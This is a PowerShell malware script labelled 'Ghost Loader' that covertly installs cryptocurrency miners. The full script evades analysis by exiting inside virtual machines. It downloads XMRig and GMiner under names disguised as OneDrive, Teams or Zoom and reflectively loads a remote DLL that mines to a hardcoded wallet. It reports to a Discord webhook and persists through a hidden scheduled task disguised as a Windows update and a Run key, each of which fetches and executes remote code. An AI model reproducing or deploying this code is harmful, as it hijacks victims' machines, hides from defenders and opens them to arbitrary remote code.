# Ghost Loader - Shielded
$u = "HolyV200"; $r = "ulta"
$dUrl = "https://raw.githubusercontent.com/$u/$r/main/Bridge.dll?v=$([Guid]::NewGuid())"
$mUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$gUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$w = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
$hook = "https://discord.com/api/webhooks/1496175217926475898/Ipm8VvLnOmN3dTUu7nyvqESjdBFRmEFmvYEr4O5tayaCfvMXpf3t_KXTjwRmO-2-i2c_"

function Send-Ping($msg) {
    if ($hook -eq "") { return }
    try {
        $j = @{ embeds = @(@{ title = "🚀 $msg"; color = 3066993; fields = @(@{ name = "Worker"; value = "$env:COMPUTERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $hook -Method Post -Body $j -ContentType "application/json" -ErrorAction SilentlyContinue -TimeoutSec 2 | Out-Null
    } catch { }
}
Send-Ping "BOOTING..."

$pns = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
$n1 = ($pns | Get-Random) + ".exe"; $n2 = ($pns | Where-Object { $_ -ne $n1 } | Get-Random) + ".exe"
$bDir = $env:LOCALAPPDATA; if ([string]::IsNullOrEmpty($bDir)) { $bDir = $env:TEMP }
$sDir = [System.IO.Path]::Combine($bDir, "Microsoft", "Windows", "UpdateCoord")

# SYSTEM CHECKS
$chk = try { @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " " } catch { "" }
if ($chk -match "VirtualBox" -or $chk -match "VMware") { exit }
if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }

function Get-File($Url, $Path) {
    if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    for ($i = 0; $i -lt 3; $i++) {
        try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path -ErrorAction Stop; return $true } catch {
            try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $ua -ErrorAction Stop | Out-Null; return $true } catch {
                try { curl.exe -L -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { return $true } } catch { }
            }
        }
        Start-Sleep -Seconds 5
    }
    return $false
}

if (-not (Test-Path $sDir)) { New-Item -ItemType Directory -Force -Path $sDir | Out-Null }
Add-Type -AssemblyName System.IO.Compression.FileSystem
$cz = Join-Path $sDir "upd_c.zip"; $gz = Join-Path $sDir "upd_g.zip"; $ce = Join-Path $sDir $n1; $ge = Join-Path $sDir $n2

# STAGING
if (-not (Test-Path $ce)) {
    if (Get-File $mUrl $cz) {
        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($cz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
        Remove-Item $cz -Force -ErrorAction SilentlyContinue
        $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($uz) { Move-Item $uz.FullName -Destination $ce -Force }
    }
}

$gd = $false
try {
    $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($cc in $ccs) {
        $nn = $cc.Name.ToUpper()
        if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2GB) {
            if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break }
        }
    }
} catch { }

if ($gd -and -not (Test-Path $ge)) {
    if (Get-File $gUrl $gz) {
        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat", "$n1" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($gz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
        Remove-Item $gz -Force -ErrorAction SilentlyContinue
        $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($uz) { Move-Item $uz.FullName -Destination $ge -Force }
    }
}

# RUN
$dp = [System.IO.Path]::Combine($sDir, "Bridge.dll")
if (Get-File $dUrl $dp) {
    try {
        $db = [System.IO.File]::ReadAllBytes($dp)
        $as = [System.Reflection.Assembly]::Load($db)
        $lt = $as.GetType("DateFundLoader")
        $sm = $lt.GetMethod("StartMiner")
        $ga = if ($gd) { $ge } else { "" }
        $sm.Invoke($null, [object[]]@([string]$ce, [string]$ga, [string]$w))
        Write-Host "running"; Send-Ping "SUCCESS/ACTIVE"
        
        $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
        $ec = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
        $tp = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $ec"
        $ad = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$tp" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue }
        else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
        return
    } catch { }
}
Write-Host "failed"; Send-Ping "FAILED/ERROR"
